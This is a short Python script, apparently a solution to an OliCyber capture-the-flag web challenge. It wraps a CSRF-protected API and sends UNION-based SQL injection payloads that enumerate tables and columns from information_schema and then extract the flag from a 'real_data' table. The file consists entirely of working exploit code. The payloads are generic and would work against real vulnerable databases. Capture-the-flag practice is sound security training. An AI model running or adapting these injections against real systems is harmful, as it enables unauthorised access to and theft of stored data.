import requests
import binascii
import time

# TEMPLATE

class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    
payload = Inj('http://web-17.challs.olicyber.it') # ottengo il link
res, err = payload.union("' UNION SELECT 1, 'a', table_name, 'a', 'f', 4 FROM information_schema.tables -- -") # prendo tutte le tabelle
# print(res)
res, err = payload.union("' UNION SELECT 1, 'a', column_name, 'a', 'f', 4 FROM information_schema.columns WHERE table_name='real_data' -- -") # prendo il nome di tutte le colonne
# print(res)
res, err = payload.union("' UNION SELECT 1, 'a', flag, 'a', 'f', 4 FROM real_data -- -") # ottengo la flag
print(res)